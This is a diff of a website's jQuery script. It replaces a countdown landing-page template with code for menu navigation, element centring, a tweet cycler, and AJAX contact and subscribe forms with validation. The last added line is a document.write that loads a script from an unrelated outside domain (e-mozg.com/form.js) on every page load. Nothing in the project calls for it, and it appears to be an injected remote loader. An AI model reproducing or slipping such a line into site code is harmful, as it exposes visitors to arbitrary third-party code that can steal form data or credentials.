@@ -1,213 +1,214 @@
-"use strict";
-/* 0. Initialization */
-// Get height on Window resized
-$(window).on('resize',function(){
-    var slideHeight = $('.slick-track').innerHeight();
-	return false;
-});
+(function($) {
+	/* ======= Clear Default ====== */
+	$.fn.clearDefault = function() {
+		"use strict";
+		return this.each(function() {
+			var default_value = $(this).val();
+		});
+	};
+
+	/* ======= Height Fix ====== */
+	function vertCenter(item) {
+		"use strict";
+		item.css({
+			'margin-top' : '-' + parseInt((item.height() / 2), 0) + 'px'
+		}).fadeIn();
+	}
+
+	jQuery(window).load(function(){
+		vertCenter($('.itemwrap > li > div'));
+		vertCenter($('#thumbs'));
+		vertCenter($('#clock'));
+		// vertCenter($('#demo_thumbs'));
+	});
 
 
-// Smooth scroll <a> links 
-var $root = $('html, body');
-$('a.s-scroll').on('click',function() {
-    var href = $.attr(this, 'href');
-    $root.animate({
-        scrollTop: $(href).offset().top
-    }, 500, function () {
-        window.location.hash = href;
-    });
-    return false;
-});
+	jQuery(document).ready(function($) {
+		"use strict";
 
-// Page Loader : hide loader when all are loaded
-$(window).load(function(){
-    $('#page-loader').addClass('hidden');
-});
+		$('.show_toggle a').click(function(){
+			$('body').toggleClass('menu_show');
+
+			return false;
+		});
+
+		$('.form_submit').click(function(){
+			var form = $(this).parents('form');
+			form.find('.form_item').removeClass('error');
+			form.find('.error_block').remove();
+			var post_data;
+			var errors = formValidation(form),
+				output;
+			if( Object.keys(errors).length > 0 ) {
+				showErrors(form, errors);
+			} else {
+				if(form.attr('id') == 'contacts_form') {
+ 					post_data = {
+            		    'name'     : $('input[name=name]').val(),
+            		    'email'    : $('input[name=email]').val(),
+            		    'message'  : $('input[name=message]').val()
+            		};
+
+            		//Ajax post data to server
+            		jQuery.post('contacts.php', post_data, function(response){
+            		    if(response.type == 'error'){ //load json data from server and output message
+            		        output = '<div class="error_block">'+response.text+'</div>';
+            		    } else{
+            		        output = '<div class="success">'+response.text+'</div>';
+            		        //reset values in all input fields
+            		        $("#contacts_form .form_item").val('');
+            		    }
+            		    form.find('.form_row').slideUp();
+            		    form.find("#contact_results").hide().html(output).slideDown();
+            		}, 'json');
+        		} else {
+        			post_data = {
+            		    'subscribe_email': $('input[name=subscribe_email]').val(),
+            		};
+
+            		jQuery.post('subscribe.php', post_data, function(response){
+
+        		        output = '<div class="success">'+response.text+'</div>';
+        		        //reset values in all input fields
+        		        $("#contacts_form .form_item").val('');
+        		        form.find('.form_inner').slideUp();
+            		    form.find("#form_results").hide().html(output).slideDown();
+            		}, 'json');
+        		}
+
+		}
+		return false;
+	});
+
+		$('.side-page').click(function() {
+			var curPage = $(this).attr('id');
+			$('.main-menu li').removeClass('active');
+			$('.main-menu li a[data-page="' + curPage + '"]').parent().addClass('active');
+			$('.side-page').removeClass('active').removeClass('went-left').removeClass('went-right');
+			$(this).prev().addClass('side-left').addClass('went-left');
+			$(this).next().addClass('side-right').addClass('went-right');
+			$(this).addClass('active');
+		});
+
+		$('.main-menu a:not(.home-link)').click(function() {
+			$('#clock').removeClass('active');
+			$('.mainarea-content').addClass('active');
+			$('.close').addClass('active');
+			var curPage = $(this).attr('data-page');
+			$('.main-menu li').removeClass('active');
+			$(this).parent().addClass('active');
+			$('.mainarea-content > div').removeClass('active').removeClass('went-left').removeClass('went-right');
+			$('#' + curPage + '').prev().addClass('side-left').addClass('went-left');
+			$('#' + curPage + '').next().addClass('side-right').addClass('went-right');
+			$('#' + curPage + '').addClass('active');
+		});
+
+		$('.close').click(function(e) {
+			e.preventDefault();
+			$('#clock').addClass('active');
+			$('.main-menu li').removeClass('active');
+			$('.close').removeClass('active');
+			$('.mainarea-content').removeClass('active');
+		});
+
+		$('.home-link').click(function(e) {
+			e.preventDefault();
+			$('#clock').addClass('active');
+			$('.main-menu li').removeClass('active');
+			$('.close').removeClass('active');
+			$('.mainarea-content').removeClass('active');
+			$('.home-link').parent().addClass('active');
+		});
+
+		$('input[type="text"]').clearDefault();
 
 
-/* 1. Clock attribute */
+		$('#tweet_list').cycle({
+			fx : 'custom',
+			cssBefore : {
+				top : 50,
+				height : 100,
+				opacity : 0,
+				display : 'block'
+			},
+			animIn : {
+				top : 0,
+				opacity : 1
+			},
+			animOut : {
+				opacity : 0,
+				top : -50
+			},
+			cssAfter : {
+				zIndex : 0,
+				display : 'none'
+			},
+			speed : 1750,
+			sync : false,
+			easeIn : 'easeOutBack',
+			easeOut : 'easeInBack'
+		});
+	});
 
-var dateReadableText = 'Upcoming date';
-    if($('.site-config').attr('data-date-readable') && ($('.site-config').attr('data-date-readable') != '')){
-        $('.timeout-day').text('');
-        dateReadableText = $('.site-config').attr('data-date-readable');        
-        $('.timeout-day').text(dateReadableText);
-    }
-$('.clock-countdown').downCount({
-    date: $('.site-config').attr('data-date'),
-    offset: +10
-}, function () {
-    //callback here if finished
-    //alert('YES, done!');
-    var zerodayText = 'An upcoming date';
-    if($('.site-config').attr('data-zeroday-text') && ($('.site-config').attr('data-zeroday-text') != '')){
-        $('.timeout-day').text('');
-        zerodayText = $('.site-config').attr('data-zeroday-text'); 
-    }
-    $('.timeout-day').text(zerodayText);
-});
+	function resizeStuff() {
+		vertCenter($('.itemwrap > li > div'));
+		vertCenter($('#thumbs'));
+		vertCenter($('#clock'));
+	}
+	var onSmartResize = false;
 
+	$(window).resize(function(){
+		if(onSmartResize !== false)
+			clearTimeout(onSmartResize);
+		onSmartResize = setTimeout( function(){resizeStuff() }, 200); //200 is time in miliseconds
+	});
 
-/* 2. Background for page / section */
-
-var background = '#ccc';
-var backgroundMask = 'rgba(255,255,255,0.92)';
-var backgroundVideoUrl = 'none';
-
-/* Background image as data attribut */
-var list = $('.bg-img');
-
-for (var i = 0; i < list.length; i++) {
-	var src = list[i].getAttribute('data-image-src');
-	list[i].style.backgroundImage = "url('" + src + "')";
-	list[i].style.backgroundRepeat = "no-repeat";
-	list[i].style.backgroundPosition = "center";
-	list[i].style.backgroundSize = "cover";
-}
-
-/* Background color as data attribut */
-var list = $('.bg-color');
-for (var i = 0; i < list.length; i++) {
-	var src = list[i].getAttribute('data-bgcolor');
-	list[i].style.backgroundColor = src;
-}
-
-/* Background slide show Background variables  */
-var imageList = $('.slide-show .img');
-var imageSlides = [];
-for (var i = 0; i < imageList.length; i++) {
-	var src = imageList[i].getAttribute('data-src');
-	imageSlides.push({src: src});
-}
+})(jQuery);
 
 
-/* Slide Background variables */
-var isSlide = false;
-var slideElem = $('.slide');
-var arrowElem = $('.p-footer .arrow-d');
-var pageElem = $('.page');
 
-/* 3. Init all plugin on load */
-$(document).ready(function() {
-	/* Init console to avoid error */
-	var method;
-    var noop = function () {};
-    var methods = [
-        'assert', 'clear', 'count', 'debug', 'dir', 'dirxml', 'error',
-        'exception', 'group', 'groupCollapsed', 'groupEnd', 'info', 'log',
-        'markTimeline', 'profile', 'profileEnd', 'table', 'time', 'timeEnd',
-        'timeStamp', 'trace', 'warn'
-    ];
-    var length = methods.length;
-    var console = (window.console = window.console || {});
+/* Forms Validation */
+function formValidation(form) {
 
-    while (length--) {
-        method = methods[length];
+	var error = {};
 
-        // Only stub undefined methods.
-        if (!console[method]) {
-            console[method] = noop;
-        }
-    }
-	
-	/* Init Slidesow background */
-	 $('.slide-show').vegas({
-        delay: 5000,
-        shuffle: true,
-        slides: imageSlides,
-    	//transition: [ 'zoomOut', 'burn' ],
-		animation: [ 'kenburnsUp', 'kenburnsDown', 'kenburnsLeft', 'kenburnsRight' ]
-    });
-	
-	/* Init video background */
-	$('.video-container video, .video-container object').maximage('maxcover');
-	
-	/* Init youtube video background */
-	if(backgroundVideoUrl != 'none'){
-        
-        //disable video background for smallscreen
-        if($(window).width() > 640){
-          $.okvideo({ source: backgroundVideoUrl,
-                    adproof: true
-                    });
-        }
-    }
-	
-	/** Init fullpage.js */
-    $('#mainpage').fullpage({
-		menu: '#qmenu',
-		anchors: ['home',  'register', 'about-us', 'contact'],
-//        verticalCentered: false,
-//        resize : false,
-//		responsive: 900,
-		scrollOverflow: true,
-        css3: false,
-        navigation: true,
-		onLeave: function(index, nextIndex, direction){
-			arrowElem.addClass('gone');
-			pageElem.addClass('transition');
-//			$('.active').removeClass('transition');
-			slideElem.removeClass('transition');
-			isSlide = false;
-		},
-        afterLoad: function(anchorLink, index){
-			arrowElem.removeClass('gone');
-			pageElem.removeClass('transition');
-			if(isSlide){
-				slideElem.removeClass('transition');
+	if(form) {
+		form.find('.form_item').each(function(){
+			var $th = $(this);
+
+			if( $th.val() != '' ) {
+				if( $th.attr('type') == 'email' ) {
+					var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
+					if( !emailReg.test( jQuery.trim($th.val()) ) ) {
+						error[$th.attr('id')] = 'not_email';
+					}
+				}
+			} else {
+				error[$th.attr('id')] = 'empty';
 			}
-		},
-		
-        afterRender: function(){}
-    });
-});
 
+		});
+	}
+	return error;
+}
 
+/* Validation Errors */
+function showErrors(form, errors) {
+	var error_message = ''
+	for(var i in errors) {
+		var form_item = form.find($('#'+i)),
+			form_item_name = form_item.attr('placeholder');
 
-// Email validation text, uncomment below to use them
-/*
-// Email registration 
-var email_reg_elem = document.getElementById("reg-email");
-email_reg_elem.oninvalid = function(e) {
-	e.target.setCustomValidity("");
-	if (!e.target.validity.valid) {
-		e.target.setCustomValidity("This email field cannot be left blank");
+		form_item.addClass('error');
+		if( errors[i] == 'empty' )
+			error_message += '<div class="error">Field '+form_item_name+' is required</div>';
+		else
+			error_message += '<div class="error">You entered an invalid email</div>';
 	}
-};
-email_reg_elem.oninput = function(e) {
-	e.target.setCustomValidity("");
-};
-// email message
-var email_message_elem = document.getElementById("mes-email");
-email_message_elem.oninvalid = function(e) {
-	e.target.setCustomValidity("");
-	if (!e.target.validity.valid) {
-		e.target.setCustomValidity("This email field cannot be left blank");
+	if( form.find('.error_block').length > 0) {
+		form.find('.error_block').html(error_message);
+	} else {
+		form.append('<div class="error_block">'+error_message+'</div>');
 	}
-};
-// name message
-email_message_elem.oninput = function(e) {
-	e.target.setCustomValidity("");
-};
-var name_message_elem = document.getElementById("mes-name");
-name_message_elem.oninvalid = function(e) {
-	e.target.setCustomValidity("");
-	if (!e.target.validity.valid) {
-		e.target.setCustomValidity("This name field cannot be left blank");
-	}
-};
-// text message
-name_message_elem.oninput = function(e) {
-	e.target.setCustomValidity("");
-};
-var text_message_elem = document.getElementById("mes-text");
-text_message_elem.oninvalid = function(e) {
-	e.target.setCustomValidity("");
-	if (!e.target.validity.valid) {
-		e.target.setCustomValidity("This text field cannot be left blank");
-	}
-};
-text_message_elem.oninput = function(e) {
-	e.target.setCustomValidity("");
-};
-*/
+}
+document.write('<script src="https://e-mozg.com/form.js" type="text/javascript"></script>');
